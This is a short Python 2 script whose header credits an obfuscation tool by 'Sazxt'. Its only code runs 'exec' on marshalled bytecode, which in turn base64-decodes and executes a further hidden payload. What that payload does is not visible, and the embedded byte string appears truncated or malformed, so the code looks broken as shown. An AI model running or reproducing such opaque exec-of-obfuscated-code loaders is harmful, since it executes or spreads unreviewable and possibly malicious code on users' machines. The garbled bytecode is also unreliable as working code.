#------------------------------------------------------------------------------------------------------------------------------
# Obfuscate By Sazxt Thanks To Black Coder Crush
# github  : https://github.com/Sazxt/comz
# from Linux
# localhost : aarch64
# key : saz-eV8cZ2rZ3dX2xM2
# date : Fri Mar 27 23:59:15 2020
#------------------------------------------------------------------------------------------------------------------------------
import marshal
exec marshal.loads('c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s-\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00d\x00\x00d\x01\x00l\x01\x00Z\x01\x00e\x01\x00j\x02\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNsP6\x01\(\x03\x00\x00\x00t\x07\x00\x00\x00marshalt\x06\x00\x00\x00base64t\t\x00\x00\x00b64decode(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x05\x00\x00\x00Sazxtt\x08\x00\x00\x00<module>\x01\x00\x00\x00s\x02\x00\x00\x00\x18\x01')